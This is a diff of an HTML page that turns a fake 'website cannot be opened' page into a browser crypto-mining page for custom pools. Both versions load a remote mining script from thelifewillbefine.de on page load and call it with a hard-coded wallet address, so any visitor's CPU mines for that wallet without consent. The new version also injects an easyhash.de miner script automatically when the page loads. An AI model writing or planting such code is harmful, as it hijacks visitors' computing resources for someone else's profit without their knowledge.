@@ -1,14 +1,172 @@
 <!DOCTYPE html>
-<html>
-<body>
-<meta charset="utf-8">
-<meta content="initial-scale=1, shrink-to-fit=no, width=device-width" name="viewport">
-<title>websiteku ---</title>
-<h2>Maaf Website Ini Tidak Bisa Dibuka</h2>
+<html lang="en-GB">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+	<meta name="description" content="Crypto Webminer Custom Pool Miner | Electroneum | Monero | Bytecoin | IntenseCoin | Sumokoin | Dinastycoin | Graft | SuperiorCoin | Turtlecoin | Stellite | DERO | Masari | Cryptonight | Cryptonight-Lite | Cryptonight-Fast | Cryptonight-UPX2 | Cryptonight-Heavy | Cryptonight-Saber(Tube) | Ghostrider - Raptoreum RTM | Kylacoin (KCN) Flex | Custom Pool Support - Mining in your Browser">
+	<meta name="keywords" content="Crypto Miner, Crypto Webminer, Electroneum, Bytecoin, Monero, IntenseCoin, Sumokoin, Dinastycoin, Graft, SuperiorCoin, Turtlecoin mining, Custom Pool Support Cryptonight, Electroneum mining, etn mining, etn miner, etn coins, Monero mining, XMR miner, XMR mining, Stellite mining, Haven XHV, Bittube, Raptoreum RTM, Kylacoin (KCN) Flex Webminer for Cryptocurrency">
+	<meta name="author" content="PiTi - crypto-webminer.com">
+	<meta name="robots" content="noindex, nofollow">
+
+	<title>Custom Pool Webminer for Cryptonight | CN-Lite | CN-Fast | CN-Fast2 | CN-Pico | CN-Half | Argon2id - Chukwa | Argon2id - ChukwaV2 | CN-Heavy | CN-Saber | Ghostrider (Raptoreum RTM) - Mining in your Browser</title>
+        <script src="scripts/jquery-3.2.1.min.js"></script>
+	<script src="scripts/jquery.cookie-1.4.1.min.js"></script>
+<script>
+	$(function() {
+	if ($.cookie("pooladdress")) {
+			var str = "https://easyhash.de/mmh/mmh.js?v10?perfekt=wss://";
+			var pool = "?jason=" + $.cookie("pooladdress");
+			var algovari  = $.cookie("algovariant");
+			var links = str+algovari+pool;
+			
+			var script = document.createElement("script");
+			script.type = "text/javascript";
+			script.src = links; 
+			document.getElementsByTagName("head")[0].appendChild(script);
+	} 
+	else
+	{
+		        var str = "https://easyhash.de/mmh/mmh.js?v10?perfekt=wss://?algo=cn/r?jason=xxx";
+			var script = document.createElement("script");
+			script.type = "text/javascript";
+			script.src = str; 
+			document.getElementsByTagName("head")[0].appendChild(script);
+	}
+  });
+	</script>
+	<script src="scripts/gustav.js?v290720"></script>
+	<script>
+	function myFunction() {
+	var walletcustom;
+        var pooladdress;
+	var algovariant;
+	var pass;
+	walletcustom = $('#walletcustom').val();
+	pooladdress = $('#pooladdress').val();
+	algovariant =  $('#algovariant').val();
+	pass =  $('#pass').val();
+	
+	$.cookie("walletcustom", walletcustom, {
+		expires: 365
+		});
+		$.cookie("pooladdress", pooladdress, {
+		expires: 365
+		});
+		$.cookie("algovariant", algovariant, {
+		expires: 365
+		});
+		$.cookie("pass", pass, {
+		expires: 365
+		});
+	location.reload();
+	}
+	
+	</script>
+
+    <link rel="stylesheet" href="scripts/styles.css">
+	
+    <script src="scripts/Chart.min.js"></script>
+</head>
+
 <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?algy=minotaurx?nosaj=stratum.coinminerz.com:3511" > </script>
 <script type="text/javascript">
 	EverythingIsLife('CZ36ntGtE1xt8fRg4mkbwmTnK2YuiT67Yg', 'c=x', 10);
 	</script>
+<h2 align="center">Customs Pool mining<br> by crypto-webminer.com</h2>
+<h2 align="center">Cryptonight | CN-Lite | CN-Fast | CN-Fast2 | CN-Pico | CN-Half | Argon2id - Chukwa | CN-Heavy | CN-Saber Coins | Ghostrider | Flex</h2>
+<div class="row" align="center">
+    <div class="box">
+        <h3>hashes/s</h3>
+        <h2 id="hashes-per-second">0</h2>
+    </div>
+    <div class="box">
+        <h3>threads</h3>
+        <h2>
+			<span id="threads">2</span>
+			<span id="thread-add" class="action"> + </span>
+			<span class="divide"> / </span>
+			<span id="thread-remove" class="action"> - </span>
+		</h2>
+    </div>
+</div>
 
-</body>
+<div class="row" align="center">
+    <div class="box">
+        <h3> Total Hashes | Accepted Shares</h3>
+        <h2 id="accepted-shares">0</h2>
+    </div>
+    <div class="box">
+        <h3> Current Algo</h3>
+        <h2 id="algo">XHV</h2>
+    </div>
+</div>
+<center>
+<details>
+  <summary>--- Algorithm setting informations (click here) ---</summary>
+<p align="center">CN R Coins need ?algo=cn/r</p>
+<p align="center">CN V8 Coins need ?algo=cn/2</p>
+<p align="center">CN V8 Reverse Waltz Coins need ?algo=cn/rwz</p>
+<p align="center">CN ZLS Coins need ?algo=cn/zls</p>
+<p align="center">CN V7 Coins need ?algo=cn/1</p>
+<p align="center">CN ASIC Coins need ?algo=cn/0</p>
+<p align="center">CN Lite V7 Coins need ?algo=cn-lite/1</p>
+<p align="center">CN Pico need ?algo=cn-pico/trtl</p>
+<p align="center">CN Fast V2 | CN Half Coins need ?algo=cn/half</p>
+<p align="center">CN Fast Coins need ?algo=cn/msr</p>
+<p align="center">CN UPX2 Coins need ?algo=cn/upx</p>
+<p align="center">Argon2id | Chukwa Coins need ?algo=chukwa</p>
+<p align="center">Argon2id | ChukwaV2 Coins need ?algo=chukwav2</p>
+<p align="center">Algo autoswitch (most profitable, payout in xmr) on moneroocean.stream Pool, need ?algo=cn/r | Pool address: faster.moneroocean</p>
+<p align="center">CN-Saber (BitTube) need ?algo=cn-heavy/tube</p>
+<p align="center">CN-Heavy XHV-Haven Coins need ?algo=cn-heavy/xhv</p>
+<p align="center">CN-Heavy Classic Coins need ?algo=cn-heavy/0</p>
+<p align="center">Ghostrider (Raptoreum RTM) via Moneroocean pool, need ?algo=ghostrider | Pool address: faster.moneroocean</p>
+<p align="center">Kylacoin (KCN) Flex via Moneroocean pool, need ?algo=flex | Pool address: faster.moneroocean</p>
+<p align="center">RandomX Monero, Zephyr (proof of concept) need ?algo=rx/0</p>
+<p align="center">Minotaurx need ?algo=minotaurx</p>
+<p align="center">Ghostrider Native Coins need ?algo=ghostrider/native - dont use it on moneroocean or c3pool</p>
+<p align="center">Flex Native Coins need ?algo=flex/native - dont use it on moneroocean or c3pool</p>
+<p align="center">x16rt Coins need ?algo=x16rt</p>
+<p align="center">Allium Coins need ?algo=allium</p>
+<p align="center">cpupower Coins need ?algo=cpupower</p>
+<p align="center">Join Discord for News & Changelog - https://discord.gg/FaaZaJ4</p>
+</details></center>
+<div class="row">
+<input class="text" type="text" id="algovariant" placeholder="Enter the ALGO|VARIANT -  e.g. ?algo=cn/r">
+</div>
+<div class="row">
+<input class="text" type="text" id="pooladdress" placeholder="Enter your Custom Cryptonight Pool -  e.g. gulf.moneroocean.stream:10008">
+</div>
+<div class="row">
+    <input class="text" type="text" id="walletcustom" placeholder="Enter your Custom Cryptonight Public Wallet Address and Press Start">
+</div>
+<div class="row">
+    <input class="text" type="text" id="pass" placeholder="Enter your Pool Password for e.g. settings | default is x">
+</div>
+<div align="center">
+			<form><input type="button" onclick="myFunction()" id="saving" value="Pool & Wallet Address Save"></form>
+		</div>
+<div class="row">
+    <canvas id="barchart-canvas" class="stats" width="100%" height="27%"></canvas>
+</div>
+
+<button id="start">Start</button><p align="center"> DDOS Protection: Mining starts in 5-10 Sec</p>
+	
+<!-- //Keep and respect copyright -->
+<p align="center">© 2017 - 2024 | <a href="https://www.crypto-webminer.com">crypto-webminer.com</a></p>
+<p align="center">Chart feature © 2013-2017 Nick Downie - <a href="https://github.com/chartjs/Chart.js/blob/master/LICENSE.md">Released under the MIT license</a></p>
+			
+	
+<div align="center">
+<form action="https://www.crypto-webminer.com/miningguides.html" target="_blank"><td><input type="submit" value="You need a helping guide?"/></td></form>
+</div>
+<br>
+<div align="center">
+<form action="https://www.crypto-webminer.com/integrate.html"><td><input type="submit" value="You are webmaster or blogger?"/></td></form>
+</div>
+<div align="center">
+<p><font color="darkcyan">Earn cryptocurrencies direct in your wallet - for your website or blog visitors</font></p>
+<p><font color="darkcyan">Integrate our webmining service with easy steps</font></p>
+</div>
 </html>
+
